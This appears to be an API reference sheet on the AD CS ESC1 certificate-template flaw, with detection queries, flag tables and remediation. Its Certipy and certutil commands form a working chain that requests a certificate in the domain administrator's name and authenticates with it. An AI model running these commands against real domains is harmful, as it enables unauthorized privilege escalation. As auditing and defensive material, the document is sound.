# API Reference: AD CS ESC1 Vulnerability

## ESC1 — Enrollee Supplies Subject Alternative Name

### Vulnerability Conditions
1. Template allows enrollee to supply SAN (`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`)
2. Template has Client Authentication EKU (OID 1.3.6.1.5.5.7.3.2)
3. Low-privileged users (Domain Users) can enroll
4. No manager approval required

## Certipy — AD CS Auditing Tool

### Find Vulnerable Templates
```bash
certipy find -u user@domain.local -p password -dc-ip 10.10.10.1 -vulnerable
```

### Request Certificate with SAN (ESC1)
```bash
certipy req -u user@domain.local -p password -dc-ip 10.10.10.1 \
    -ca CORP-CA -template VulnerableTemplate \
    -upn administrator@domain.local
```

### Authenticate with Certificate
```bash
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1
```

## certutil — Windows Built-in

### List Templates
```cmd
certutil -v -template
certutil -catemplates
certutil -TCAInfo
```

### Request Certificate
```cmd
certutil -submit -attrib "SAN:upn=admin@domain.local" request.req
```

## Certificate Template Flags

### msPKI-Certificate-Name-Flag
| Value | Name | Risk |
|-------|------|------|
| 0x00000001 | CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT | CRITICAL |
| 0x00010000 | CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT_ALT_NAME | CRITICAL |

### msPKI-Enrollment-Flag
| Value | Name |
|-------|------|
| 0x00000002 | CT_FLAG_PEND_ALL_REQUESTS (manager approval) |
| 0x00000020 | CT_FLAG_AUTO_ENROLLMENT |

## LDAP Queries for AD CS

### Find templates with ENROLLEE_SUPPLIES_SUBJECT
```ldap
(&(objectClass=pKICertificateTemplate)
  (msPKI-Certificate-Name-Flag:1.2.840.113556.1.4.804:=1))
```

### Find CAs
```ldap
(objectClass=pKIEnrollmentService)
```

## PowerShell — PSPKI Module

### Install
```powershell
Install-Module -Name PSPKI
```

### Get Templates
```powershell
Get-CertificateTemplate | Where-Object {
    $_.Flags -band 1  # ENROLLEE_SUPPLIES_SUBJECT
} | Select-Object Name, Flags, OID
```

## Remediation
1. Remove `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` from template flags
2. Require CA manager approval for certificate issuance
3. Restrict enrollment permissions to specific security groups
4. Enable certificate auditing (Event ID 4887)
